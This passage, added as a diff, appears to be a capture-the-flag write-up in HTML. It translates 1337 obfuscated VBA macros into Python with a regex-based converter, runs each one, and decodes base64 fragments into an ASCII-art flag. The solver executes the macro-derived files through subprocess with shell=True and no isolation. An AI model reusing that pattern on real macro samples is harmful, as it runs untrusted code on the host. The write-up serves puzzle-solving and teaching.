+            <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="p">(</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span><span class="p">,</span> <span class="n">lleft</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span><span class="s">''</span><span class="p">)))</span>
+            <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r' *([a-zA-Z]+).*Then ([^ ]+) = len\((.+)\)'</span><span class="p">,</span><span class="s">r'</span><span class="si">%</span><span class="s">sif \1 == 0:\n</span><span class="si">%</span><span class="s">s\2 = len(\3)'</span> <span class="o">%</span> <span class="p">(</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span><span class="p">,</span> <span class="s">'    '</span> <span class="o">*</span> <span class="p">(</span><span class="n">indent</span> <span class="o">+</span><span class="mi">1</span><span class="p">)),</span><span class="n">lright</span><span class="p">))</span>
+            <span class="k">continue</span>
+
+        <span class="c"># match multiline stuff</span>
+        <span class="k">if</span> <span class="n">l</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'_'</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c"># Remove leading '_'</span>
+
+        <span class="k">if</span> <span class="s">'Mid('</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r'Mid\(([^,]+), *([^,]+), *([0-9]+)\)'</span><span class="p">,</span> <span class="s">r'\1[\2-1:\2+\3-1]'</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s">'Array('</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Array('</span><span class="p">,</span><span class="s">'['</span><span class="p">)</span>
+            <span class="n">inArray</span> <span class="o">=</span> <span class="bp">True</span>
+
+        <span class="c"># Close array if in Array</span>
+        <span class="k">if</span> <span class="n">inArray</span> <span class="ow">and</span> <span class="s">')'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">inArray</span> <span class="o">=</span> <span class="bp">False</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">')'</span><span class="p">,</span><span class="s">']'</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>  <span class="c"># Change first parenthesis to array close</span>
+
+        <span class="c"># We need to get the 5th call to first_func to print it</span>
+        <span class="k">if</span> <span class="n">first_func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">first_func</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">first_func_count</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="n">first_func_count</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
+                <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()))</span>
+                <span class="n">position</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span> <span class="p">)</span> <span class="o">+</span> <span class="s">'print("POS:"+'</span> <span class="o">+</span> <span class="n">position</span> <span class="o">+</span> <span class="s">')'</span><span class="p">)</span>
+                <span class="k">continue</span>
+
+        <span class="c"># While loop</span>
+        <span class="k">if</span> <span class="s">'While'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'While'</span><span class="p">,</span><span class="s">'while'</span><span class="p">)</span>
+            <span class="n">l</span> <span class="o">+=</span> <span class="s">':'</span>
+            <span class="n">toIndent</span> <span class="o">=</span> <span class="bp">True</span>
+
+        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()))</span>
+
+        <span class="k">if</span> <span class="n">toIndent</span><span class="p">:</span>
+            <span class="n">toIndent</span> <span class="o">=</span> <span class="bp">False</span>
+            <span class="n">indent</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">s()'</span> <span class="o">%</span> <span class="n">last_func</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Once we have this, we can also save our 1337 python files :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/</span><span class="si">%</span><span class="s">s.macro.py'</span> <span class="o">%</span> <span class="n">index</span><span class="p">,</span><span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">output</span><span class="p">:</span>
+                    <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">vba2py</span><span class="p">(</span><span class="n">macro_code</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="run-the-pycros">Run the pycros</h2>
+
+<p>So, then, we just run our 1337 macro files, and we see that most of the time we get a “POSITION” string printed, and sometimes a string like ‘ONE’, ‘TWO’ up to ‘SEVENTEEN’.
+We just ignore the results with POSITION, and sort the others :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">interesting</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1338</span><span class="p">):</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s">"python3 /tmp/</span><span class="si">%</span><span class="s">s.macro.py"</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+    <span class="k">if</span> <span class="s">'POSITION'</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">pos</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">n'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">b64data</span> <span class="o">=</span> <span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"'"</span><span class="p">,</span><span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">n'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64data</span><span class="p">)</span>
+        <span class="n">interesting</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"## Step 3 : Print FLAG"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'ONE'</span><span class="p">,</span><span class="s">'TWO'</span><span class="p">,</span><span class="s">'THREE'</span><span class="p">,</span><span class="s">'FOUR'</span><span class="p">,</span><span class="s">'FIVE'</span><span class="p">,</span><span class="s">'SIX'</span><span class="p">,</span><span class="s">'SEVEN'</span><span class="p">,</span><span class="s">'EIGHT'</span><span class="p">,</span><span class="s">'NINE'</span><span class="p">,</span><span class="s">'TEN'</span><span class="p">,</span><span class="s">'ELEVEN'</span><span class="p">,</span><span class="s">'TWELVE'</span><span class="p">,</span><span class="s">'THIRTEEN'</span><span class="p">,</span><span class="s">'FOURTEEN'</span><span class="p">,</span><span class="s">'FIFTEEN'</span><span class="p">,</span><span class="s">'SIXTEEN'</span><span class="p">,</span><span class="s">'SEVENTEEN'</span><span class="p">]:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">interesting</span><span class="p">[</span><span class="n">p</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="mi">8</span><span class="p">]))</span>
+</code></pre></div></div>
+
+<p>And here you get the flag, in ASCII art :)</p>
+
+<p>For thoses who are interested, I put the full python script ;)</p>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
